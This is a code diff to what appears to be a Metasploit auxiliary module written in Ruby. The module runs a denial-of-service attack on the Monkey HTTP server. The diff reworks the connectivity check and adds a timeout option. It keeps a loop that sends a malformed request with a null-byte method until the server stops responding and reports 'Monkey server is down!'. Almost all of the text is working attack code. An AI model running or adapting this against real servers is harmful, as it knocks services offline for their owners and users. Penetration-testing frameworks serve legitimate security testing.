@@ -34,52 +34,47 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(2001),
+				OptInt.new("TIMEOUT", [ false, "Set timeout for connectivity check", 30 ]),
 			], self.class)
 	end
 
 	def is_alive
-		begin
-			connect
-			res = send_request_raw({
-				'method' => "GET",
-				'uri' => "/"
-			})
-			if res == nil
-				raise ::Rex::ConnectionTimeout
-			end
-		rescue ::Rex::ConnectionTimeout
-			res = ''
-			print_good("Monkey server is down!")
-		ensure
-			disconnect
+		connect
+		res = send_request_raw({
+			'method' => "GET",
+			'uri' => "/"
+		}, timeout = datastore['TIMEOUT'])
+		if ! res
+			raise ::Rex::ConnectionTimeout
 		end
-		res
+		disconnect
 	end
 
 	def run
 		loop do
 			begin
-				if ! is_alive
-					break
-				end
+				is_alive
 				connect
 				print_status("Sending DoS packet to #{rhost}:#{rport}")
-
-				res = send_request_raw({
-					'method' => "\x00",
-					'uri' => "/"
-				}, timeout = 1)
-				sleep 1
+				send_request_raw({'method' => "\x00"})
 				disconnect
 			rescue ::Rex::ConnectionRefused
 				print_status("Unable to connect to #{rhost}:#{rport}.")
 				break
 			rescue ::Errno::ECONNRESET
 				print_status("DoS packet successful. #{rhost} not responding.")
-			rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
+				break
+			rescue ::Rex::HostUnreachable
 				print_status("Couldn't connect to #{rhost}:#{rport}.")
+				break
 			rescue ::Timeout::Error, ::Errno::EPIPE
 				print_status("Timeout error connecting to #{rhost}:#{rport}.")
+				break
+			rescue ::Rex::ConnectionTimeout
+				print_good("Monkey server is down!")
+				break
+			ensure
+				disconnect
 			end
 		end
 	end
